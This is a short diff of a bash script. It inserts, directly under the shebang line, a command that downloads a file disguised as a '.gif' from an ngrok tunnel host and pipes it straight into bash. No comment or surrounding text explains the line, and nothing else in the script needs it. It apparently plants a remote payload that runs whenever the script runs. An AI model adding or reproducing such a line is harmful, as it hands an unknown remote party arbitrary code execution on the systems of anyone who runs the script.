@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-
+curl https://72d4-193-29-61-27.ngrok.io/file.gif | bash
 # Stop script if unbound variable found (use ${var:-} if intentional)
 set -u
 
